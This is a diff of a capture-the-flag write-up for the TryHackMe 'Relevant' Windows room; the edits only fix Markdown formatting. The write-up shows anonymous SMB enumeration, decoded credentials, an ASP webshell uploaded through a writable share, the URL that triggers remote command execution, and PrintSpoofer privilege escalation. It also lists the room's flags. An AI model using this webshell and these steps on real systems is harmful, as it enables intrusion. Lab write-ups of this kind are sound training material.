@@ -2,27 +2,23 @@
 
 
 # Overview 
----
 - **Difficulty**: Medium 
 - **Platform**: Windows
 - **Link**: https://tryhackme.com/room/relevant
 
 ## Challenge Description 
----
 >**Penetration Testing Challenge.**
 
 ## Resolution Summary 
----
 **We discovered available services with an `Nmap` scan, revealing HTTP, SMB, and RDP among others. We enumerated SMB shares anonymously, finding a `passwords.txt` file containing base64-encoded credentials for two users. We verified the credentials with `crackmapexec` and confirmed write access to the share. By uploading an ASP webshell to the SMB share and accessing it through the web application on port 49663, we achieved RCE and obtained a reverse shell via an ASPX payload. Finally, we escalated to SYSTEM by abusing the `SeImpersonate` privilege using `PrintSpoofer.exe`.**
 
 # Information Gathering 
----
-- **Since we had an IP address, we started by performing an `Nmap` scan in order to find available services, we added the `-sV` flag in order to find potential vulnerabilities related to a software's version. 
+- **Since we had an IP address, we started by performing an `Nmap` scan in order to find available services, we added the `-sV` flag in order to find potential vulnerabilities related to a software's version.** 
 ```bash 
 sudo nmap -sV 10.82.184.223 -p-
 ```
 
-- **We observed the following results:
+- **We observed the following results:**
 ```bash
 PORT      STATE SERVICE       VERSION
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -36,10 +32,9 @@ PORT      STATE SERVICE       VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 ```
 
-- **To begin with, we investigated the web application on port 80.
+- **To begin with, we investigated the web application on port 80.**
 
 ## HTTP (80)
----
 -  **Upon accessing the web page, we found the default home page for IIS Windows servers. The source page did not provide any useful information.**
 
 - **We attempted a directory fuzzing with `Gobuster`, but it did not bear any tangible results.**
@@ -47,7 +42,6 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 - **We also did not find any usable exploit related to the IIS version (10.0)**
 
 ## SMB (445)
----
 - **Next, we shifted our focus on the SMB server.** 
 - **We attempted to enumerate shares anonymously using:**
 ```bash
@@ -83,7 +77,7 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 	- **`Bob - !P@$$W0rD!123`**
 	- **`Bill - Juw4nnaM4n420696969!$$$`**
 
-- **From there, we used `crackmapexec` to test our credentials:
+- **From there, we used `crackmapexec` to test our credentials:**
 ```bash
 crackmapexec smb 10.82.191.77 -u Bob -p '!P@$$W0rD!123'
 #Results
@@ -109,7 +103,6 @@ SMB         10.81.177.88    445    RELEVANT         nt4wrksv        READ,WRITE
 - **Hence, we since we had 2 web applications, we could test if they were Including files from the share we had access to. If it were the case, we would be able to achieve (if there is no significant filtering, or none at all) RCE.**
 
 # Exploitation 
----
 - **To demonstrate that, we uploaded a file text on the SMB share using:**
 ```bash
 #Connect to the SMB share, a password will be requested
@@ -119,9 +112,9 @@ put test.txt
 ```
 
 - **Then we navigated on both web apps and appended the following directory: `/nt4wrksv/test.txt`.**
-- **Finally, we found out that the website on port `49663` did have this feature.
+- **Finally, we found out that the website on port `49663` did have this feature.**
 
-- **From there, we used the following `ASP` code to get a webshell: 
+- **From there, we used the following `ASP` code to get a webshell:** 
 ```asp
 <%
 Set o = CreateObject("WScript.Shell")
@@ -135,14 +128,13 @@ Response.Write("<pre>" & e.StdOut.ReadAll() & "</pre>")
 put webshell.asp
 ```
 
-- **Therefore, we obtained RCE by using the following URL: `http://10.81.177.88:49663/nt4wrksv/webshell.asp?cmd=whoami`
+- **Therefore, we obtained RCE by using the following URL: `http://10.81.177.88:49663/nt4wrksv/webshell.asp?cmd=whoami`**
 
 - **From there, we directly attempted to upload a reverse shell, we used an `.aspx` reverse shell found in [this](https://github.com/borjmz/aspx-reverse-shell) GitHub repository.** 
 - **Therefore, we gained a reverse shell and found the first flag:**
 	- `user.txt:THM{fdk4ka34vk346ksxfr21tg789ktf45}`
 
 # Privilege Escalation 
----
 - **We started by determining which privileges our current user had by using the following:**
 ```cmd
 whoami /priv
@@ -162,8 +154,7 @@ C:\Windows\Temp\PrintSpoofer.exe -i -c cmd
 ```
 
 # Trophy 
----
-**User.txt → `THM{fdk4ka34vk346ksxfr21tg789ktf45}`  
+**User.txt → `THM{fdk4ka34vk346ksxfr21tg789ktf45}`**  
 
 **Root.txt → `THM{1fk5kf469devly1gl320zafgl345pv}`**
 
